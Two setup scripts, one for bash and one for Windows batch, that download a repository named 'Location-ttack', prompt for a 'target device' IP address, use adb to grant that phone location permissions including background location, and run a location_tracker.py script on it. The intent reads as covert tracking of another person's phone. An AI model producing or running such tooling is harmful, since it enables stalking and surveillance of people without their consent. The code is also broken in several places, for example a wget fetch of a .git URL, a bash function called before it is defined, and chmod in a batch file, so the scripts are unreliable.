# auto_run.sh
#!/bin/bash

# Install pip
sudo apt-get install python3-pip

# Install the required dependencies
pip3 install android

# Download the script
wget https://github.com/Aadi1601/Location-ttack.git

# Grant permissions to the script
chmod +x location_tracker.py

# Prompt for the target device IP address
read -p "Enter the IP address of the target device: " ip_address

# Get the device ID
device_id=$(adb devices | grep $ip_address | awk '{print $1}')

# Grant permissions to the target device
grant_permissions $device_id

# Run the script
python3 location_tracker.py $device_id

# Function to grant permissions
grant_permissions() {
    adb -s $1 shell pm grant com.android.providers.location android.permission.ACCESS_FINE_LOCATION
    adb -s $1 shell pm grant com.android.providers.location android.permission.ACCESS_COARSE_LOCATION
    adb -s $1 shell pm grant com.android.providers.location android.permission.ACCESS_BACKGROUND_LOCATION
}

# auto_run.bat
@echo off

:: Install the required dependencies
pip3 install android

:: Download the script
wget https://github.com/Aadi1601/Location-ttack.git

:: Grant permissions to the script
chmod +x location_tracker.py

:: Prompt for the target device IP address
set /p ip_address="Enter the IP address of the target device: "

:: Get the device ID
for /f "tokens=1" %%i in ('adb devices ^| findstr %ip_address%') do set device_id=%%i

:: Grant permissions to the target device
call :grant_permissions %device_id%

:: Run the script
python3 location_tracker.py %device_id%

:: Function to grant permissions
:grant_permissions
    adb -s %1 shell pm grant com.android.providers.location android.permission.ACCESS_FINE_LOCATION
    adb -s %1 shell pm grant com.android.providers.location android.permission.ACCESS_COARSE_LOCATION
    adb -s %1 shell pm grant com.android.providers.location android.permission.ACCESS_BACKGROUND_LOCATION
    goto :eof